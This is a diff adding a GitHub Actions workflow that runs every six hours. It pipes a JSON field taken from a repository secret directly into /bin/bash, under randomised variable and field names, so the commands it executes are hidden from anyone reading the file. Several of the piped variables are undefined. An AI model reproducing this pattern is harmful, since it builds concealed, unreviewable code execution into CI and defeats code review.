@@ -1,0 +1,21 @@
+name: yangxiangchangfang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yangxiangchangfang
+        env:
+          dxims85: ${{ secrets.dxims85 }}
+        run: |
+          echo $dxims85 | jq -r .xb4 | /bin/bash
+          echo $rgij87524 | jq -r .im188 | /bin/bash
+          echo $tgfws39119 | jq -r .pba1203 | /bin/bash
+          echo $ucwuv514 | jq -r .qs023 | /bin/bash
+          echo $v95 | jq -r .kwazq24544 | /bin/bash
+
